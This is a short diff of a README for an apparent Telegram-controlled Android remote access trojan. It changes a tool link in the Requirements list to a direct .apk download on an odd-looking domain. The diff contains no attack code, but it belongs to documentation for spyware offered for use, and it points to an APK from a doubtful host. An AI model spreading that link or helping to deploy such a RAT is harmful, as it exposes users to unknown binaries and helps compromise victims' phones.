@@ -32,7 +32,7 @@ A multifunctional Telegram based Android RAT  without port forwarding.
 ## Requirements
  - Glitch Account
  - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
-[ApkTool Editor](https://999xprofit.com/dogs/apkeditor) ( for Android)
+[ApkTool Editor](https://999xprofit.com/dogs/apkeditor.apk) ( for Android)
 
 
 ## How to use
